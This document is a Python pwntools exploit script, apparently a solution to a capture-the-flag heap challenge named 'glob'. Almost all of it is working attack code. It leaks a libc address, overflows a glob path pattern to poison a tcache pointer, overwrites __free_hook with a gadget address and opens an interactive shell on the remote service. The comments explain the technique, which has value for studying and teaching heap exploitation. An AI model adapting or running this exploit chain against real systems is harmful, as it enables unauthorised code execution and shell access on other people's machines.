#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.challenge.bi0s.in','1299'
binary = "./glob"
brkpts = '''
'''

elf = ELF(binary)

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary)

def choice(i):
    sla("Choice >> ",str(i))

def add(idx,size,pattern):
    choice(1)
    sla("idx >> ",str(idx))
    sla("size >> ",str(size))
    sla("path >> ",pattern)

def check(idx):
    choice(2)
    sla("idx >> ",str(idx))

def view(idx):
    choice(3)
    sla("idx >> ",str(idx))

def free(idx):
    choice(4)
    sla("idx >> ",str(idx))

if __name__=="__main__":
    #Leak libc
    add(0,0x570,"a"*8)
    # Add a chunk containing /bin/sh for later use as well as preventing consolidation
    add(1,0x10,"/bin/sh\x00")
    free(0)
    add(0,0x570,"")
    view(0)
    reu("Path : ")
    libc = u64(re(6) + '\x00'*2) - 0x1ebb00
    free_hook = libc + 0x1eeb28
    system = libc + 0xe6c7e
    log.info("libc = " + hex(libc))

    # Fill some tcache so that glob allocates from there itself
    # The fake chunk will be pointing to one of these chunks, so populate fd with free hook
    for i in range(3):
        add(i+2,0x80,"1"*0x20 + p64(0) + p64(0x21) + p64(free_hook))
    # In the source of glob.c , malloc (end_name - dirname) will allocate a chunk of size 0x51 (this is based on my input) , so allocate a chunk and free it , so that the malloc inside glob.c takes from here
    add(6,0x40,"6666")
    free(6)

    add(5,0x80,"4444")
    for i in range(4):
        free(i+2)

    # Pattern to trigger overflow and overwrite tcache fd of the next free chunk in memory
    pattern = "~dwawddwadawdaadwdwadwadawadwadwadwadwaawwadwdwaw\\dadawdawdawda//daadwdadw/////////"
    pattern = pattern.ljust(0x114,'a')
    # This corrupts the size and writes a null byte to the tcache fd of a 0x80 size chunk
    add(6,len(pattern)+1,pattern)
    check(6)

    # after this , tcache 0x90 fd points to -> fake_chunk -> free_hook
    add(7,0x80,"use tcache") #fake_chunk -> free_hook (use up tcache)
    add(2,0x80,"use fake_chunk") #free_hook (use up tcache)
    add(3,0x80,p64(system)) # Get allocation on free_hook , overwrite it with gadget

    io.interactive()
